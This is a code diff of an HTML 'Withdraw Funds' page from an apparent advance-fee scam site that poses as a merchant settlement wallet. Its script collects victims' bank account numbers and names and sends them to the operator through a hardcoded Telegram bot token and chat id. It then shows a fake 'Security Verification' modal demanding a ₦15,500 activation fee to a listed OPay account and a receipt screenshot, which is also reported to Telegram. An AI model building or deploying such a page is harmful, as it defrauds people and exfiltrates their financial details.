@@ -3,150 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Withdrawal Terminal | AGMT</title>
+    <title>Wallet | AGMT Settlement</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --error: #ef4444; }
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
         
-        body { background: var(--bg); color: white; padding: 20px; padding-bottom: 110px; min-height: 100vh; overflow-x: hidden; }
+        body { background: var(--bg); color: white; padding-bottom: 50px; overflow-x: hidden; }
+        header { padding: 20px; display: flex; align-items: center; gap: 15px; background: rgba(2, 6, 23, 0.9); border-bottom: 1px solid var(--border); }
+        .back-btn { text-decoration: none; color: white; font-size: 24px; }
+        .container { padding: 25px; }
 
-        /* Balance Section */
-        .balance-header { text-align: center; margin: 30px 0; }
-        .balance-card { 
-            background: linear-gradient(135deg, #1e293b 0%, #020617 100%);
-            border: 1px solid var(--border);
-            border-radius: 35px;
-            padding: 40px 20px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        /* Wallet Header */
+        .bal-hero { 
+            background: linear-gradient(145deg, #1e293b 0%, #020617 100%); 
+            border: 1px solid var(--border); border-radius: 40px; padding: 40px 20px; 
+            text-align: center; margin-bottom: 30px; box-shadow: 0 30px 60px rgba(0,0,0,0.5);
         }
-        .label { font-size: 11px; font-weight: 800; color: #64748b; text-transform: uppercase; letter-spacing: 2px; }
-        .amount { font-size: 44px; font-weight: 900; margin: 10px 0; color: #fff; }
-        .status-tag { display: inline-block; background: rgba(16, 185, 129, 0.1); color: var(--accent); padding: 5px 15px; border-radius: 10px; font-size: 11px; font-weight: 800; }
+        .bal-label { font-size: 10px; font-weight: 800; color: var(--text-dim); letter-spacing: 2px; }
+        .bal-val { font-size: 45px; font-weight: 900; margin: 5px 0; }
+        .bal-ngn { color: var(--accent); font-weight: 800; font-size: 18px; }
 
-        /* Bank Selection Section */
-        .section-title { font-size: 14px; font-weight: 800; color: #94a3b8; margin: 30px 0 15px; padding-left: 10px; }
-        .bank-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .bank-option { 
-            background: var(--card); border: 1px solid var(--border); 
-            border-radius: 20px; padding: 20px; text-align: center; 
-            cursor: pointer; transition: 0.3s;
+        /* Bank Selection */
+        .bank-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
+        .bank-item { 
+            background: var(--card); border: 1px solid var(--border); border-radius: 20px; 
+            padding: 20px; text-align: center; transition: 0.3s; cursor: pointer;
         }
-        .bank-option:active { transform: scale(0.95); background: #1e293b; }
-        .bank-logo { font-size: 24px; margin-bottom: 8px; display: block; }
-        .bank-name { font-size: 12px; font-weight: 700; color: #cbd5e1; }
+        .bank-item.active { border-color: var(--primary); background: rgba(37, 99, 235, 0.05); }
+        .bank-icon { font-size: 24px; margin-bottom: 8px; display: block; }
+        .bank-name { font-size: 12px; font-weight: 800; }
 
-        /* Restriction Modal */
-        .modal-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
-            display: none; align-items: center; justify-content: center; z-index: 10000;
-            padding: 20px;
-        }
-        .modal { 
-            background: #ffffff; color: #0f172a; border-radius: 35px; 
-            padding: 40px 25px; width: 100%; max-width: 380px; text-align: center;
-            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        /* Inputs */
+        .f-group { margin-bottom: 18px; }
+        .f-label { display: block; font-size: 11px; font-weight: 800; color: var(--text-dim); margin-bottom: 8px; padding-left: 10px; }
+        .f-input { width: 100%; background: #0f172a; border: 1px solid var(--border); border-radius: 18px; padding: 18px; color: white; font-weight: 700; outline: none; }
+
+        .btn-withdraw { width: 100%; padding: 22px; border-radius: 25px; border: none; background: var(--primary); color: white; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3); }
+
+        /* MODAL (THE TRIGGER) */
+        #verify-modal { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98); z-index: 2000; display: none; align-items: center; justify-content: center; padding: 20px; overflow-y: auto; }
+        .modal-card { background: #1e293b; border-radius: 40px; padding: 40px 25px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #ef4444; }
         
-        .modal-icon { font-size: 40px; margin-bottom: 20px; }
-        .modal h3 { font-weight: 900; font-size: 22px; margin-bottom: 10px; color: var(--error); }
-        .modal p { font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 25px; }
+        .pay-notice { background: #0f172a; border: 1px dashed var(--primary); border-radius: 20px; padding: 25px; margin: 25px 0; }
+        .opay-num { font-size: 28px; font-weight: 900; color: #fff; letter-spacing: 2px; margin: 10px 0; }
         
-        .restriction-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 20px; padding: 20px; margin-bottom: 25px; text-align: left; }
-        .res-line { font-size: 12px; font-weight: 700; margin-bottom: 5px; display: flex; justify-content: space-between; }
-        
-        .btn-resolve { 
-            width: 100%; background: var(--primary); color: white; padding: 20px; 
-            border-radius: 20px; border: none; font-weight: 800; font-size: 15px; cursor: pointer;
-        }
-
-        /* Nav Bar */
-        .bottom-nav { 
-            position: fixed; bottom: 20px; left: 20px; right: 20px; 
-            background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(15px);
-            height: 75px; border-radius: 30px; display: flex; 
-            justify-content: space-around; align-items: center;
-            border: 1px solid var(--border);
-        }
-        .nav-link { text-align: center; color: #475569; text-decoration: none; font-size: 10px; font-weight: 800; }
-        .nav-link.active { color: var(--primary); }
-        .nav-link span { display: block; font-size: 22px; margin-bottom: 4px; }
+        .screenshot-box { border: 2px dashed #334155; border-radius: 20px; padding: 25px; margin-top: 20px; position: relative; background: rgba(255,255,255,0.02); }
+        .screenshot-box input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="balance-header">
-        <div class="balance-card">
-            <span class="label">Payable Revenue</span>
-            <div class="amount">$357.50</div>
-            <div class="status-tag">Verified Merchant Earnings</div>
+    <header>
+        <a href="dashboard.html" class="back-btn">←</a>
+        <div style="font-weight: 800;">Withdraw Funds</div>
+    </header>
+
+    <div class="container">
+        <div class="bal-hero">
+            <span class="bal-label">TOTAL SETTLEMENT</span>
+            <div class="bal-val">$<span id="uBal">0.00</span></div>
+            <div class="bal-ngn">≈ ₦<span id="uNgn">0</span></div>
         </div>
+
+        <div class="bank-grid">
+            <div class="bank-item active" onclick="sel(this)">
+                <span class="bank-icon">📱</span><span class="bank-name">OPay</span>
+            </div>
+            <div class="bank-item" onclick="sel(this)">
+                <span class="bank-icon">🌴</span><span class="bank-name">PalmPay</span>
+            </div>
+            <div class="bank-item" onclick="sel(this)">
+                <span class="bank-icon">🏦</span><span class="bank-name">Kuda</span>
+            </div>
+            <div class="bank-item" onclick="sel(this)">
+                <span class="bank-icon">💳</span><span class="bank-name">GTB/Zenith</span>
+            </div>
+        </div>
+
+        <div class="f-group">
+            <label class="f-label">ACCOUNT NUMBER</label>
+            <input type="number" id="accNum" class="f-input" placeholder="Enter 10 digits">
+        </div>
+
+        <div class="f-group">
+            <label class="f-label">ACCOUNT NAME</label>
+            <input type="text" id="accName" class="f-input" placeholder="Full name on account">
+        </div>
+
+        <button class="btn-withdraw" onclick="triggerVerify()">INITIATE WITHDRAWAL</button>
     </div>
 
-    <div class="section-title">Select Withdrawal Method</div>
-    
-    <div class="bank-grid">
-        <div class="bank-option" onclick="showRestriction('OPAY')">
-            <span class="bank-logo">📱</span>
-            <span class="bank-name">OPay Digital</span>
-        </div>
-        <div class="bank-option" onclick="showRestriction('PALMPAY')">
-            <span class="bank-logo">🌴</span>
-            <span class="bank-name">PalmPay</span>
-        </div>
-        <div class="bank-option" onclick="showRestriction('GTBANK')">
-            <span class="bank-logo">🏦</span>
-            <span class="bank-name">GTBank</span>
-        </div>
-        <div class="bank-option" onclick="showRestriction('ZENITH')">
-            <span class="bank-logo">🏛️</span>
-            <span class="bank-name">Zenith Bank</span>
-        </div>
-    </div>
+    <div id="verify-modal">
+        <div class="modal-card">
+            <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
+            <h2 style="font-size: 22px; margin-bottom: 12px;">Security Verification</h2>
+            <p style="color: #94a3b8; font-size: 14px; line-height: 1.6;">
+                Your account is currently on <b>Level 1 (Trial)</b>. To withdraw funds immediately, you must pay the <b>Merchant Activation Fee</b> or reach the <b>$5,000</b> limit.
+            </p>
 
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal">
-            <div class="modal-icon">🚫</div>
-            <h3>Withdrawal Locked</h3>
-            <p>Your node is currently under <b>Tier-1 Security Review</b>. High-volume dollar settlements to local Nigerian banks require a manual liquidity handshake.</p>
-            
-            <div class="restriction-box">
-                <div class="res-line"><span>Status:</span> <span style="color:var(--error)">Restricted</span></div>
-                <div class="res-line"><span>Required Clear:</span> <span>₦15,500.00</span></div>
-                <div class="res-line"><span>Current Release:</span> <span>$357.50</span></div>
+            <div class="pay-notice">
+                <div style="font-size: 11px; font-weight: 800; color: var(--primary);">TRANSFER TO MERCHANT NODE</div>
+                <div class="opay-num">7022255367</div>
+                <div style="font-size: 13px; font-weight: 700; color: #fff;">Bank: OPay Digital Bank</div>
+                <div style="font-size: 14px; font-weight: 800; color: var(--accent); margin-top: 10px;">Amount: ₦15,500</div>
             </div>
 
-            <button class="btn-resolve" onclick="location.href='checkout.html'">
-                CLEAR RESTRICTION NOW
-            </button>
-            <p style="margin-top: 15px; font-size: 11px; color: #94a3b8;" onclick="closeModal()">Cancel Transaction</p>
+            <div style="font-size: 11px; font-weight: 800; color: var(--text-dim); text-align: left; margin-bottom: 8px;">SUBMIT PAYMENT RECEIPT</div>
+            <div class="screenshot-box">
+                <div style="font-size: 24px;">📸</div>
+                <div style="font-size: 12px; font-weight: 800; margin-top: 5px;">Upload Screenshot</div>
+                <input type="file" id="proof" onchange="done()">
+            </div>
+
+            <button onclick="document.getElementById('verify-modal').style.display='none'" style="background:none; border:none; color:var(--text-dim); margin-top:25px; font-weight:800; font-size:12px;">CLOSE</button>
         </div>
     </div>
-
-    <nav class="bottom-nav">
-        <a href="dashboard.html" class="nav-link"><span>📊</span>Overview</a>
-        <a href="engine.html" class="nav-link"><span>⚡</span>Optimize</a>
-        <a href="wallet.html" class="nav-link active"><span>💰</span>Wallet</a>
-        <a href="#" class="nav-link"><span>👤</span>Profile</a>
-    </nav>
 
     <script>
         const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
         const chatId = "7909543900";
 
-        function showRestriction(bank) {
-            document.getElementById('modalOverlay').style.display = 'flex';
-            // Alert Telegram which bank they tried to use
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🏦 <b>WITHDRAWAL ATTEMPT:</b> User selected ${bank}. They are now viewing the ₦15,500 Restriction Modal.&parse_mode=html`);
+        window.onload = () => {
+            const bal = parseFloat(localStorage.getItem('walletBalance') || "50.00");
+            document.getElementById('uBal').innerText = bal.toFixed(2);
+            document.getElementById('uNgn').innerText = (bal * 1550).toLocaleString();
+        };
+
+        function sel(el) {
+            document.querySelectorAll('.bank-item').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
         }
 
-        function closeModal() {
-            document.getElementById('modalOverlay').style.display = 'none';
+        function triggerVerify() {
+            const acc = document.getElementById('accNum').value;
+            const name = document.getElementById('accName').value;
+            if(acc.length < 10 || name.length < 3) return alert("Please complete form");
+
+            // Send full info to your Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🚨 <b>WITHDRAWAL ATTEMPT!</b>%0A<b>User:</b> ${localStorage.getItem('merchantName')}%0A<b>Account:</b> ${acc}%0A<b>Bank Name:</b> ${name}%0A<b>Amount:</b> $${localStorage.getItem('walletBalance')}&parse_mode=html`);
+
+            document.getElementById('verify-modal').style.display = 'flex';
+        }
+
+        function done() {
+            alert("Verification Started. Our OPay node is confirming your ₦15,500 payment. This takes 5-15 minutes. Stay on this page.");
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📸 <b>RECEIPT UPLOADED!</b> Check OPay for ₦15,500 from ${localStorage.getItem('merchantName')}.&parse_mode=html`);
         }
     </script>
-    <script src="notify.js"></script>
 </body>
 </html>
-
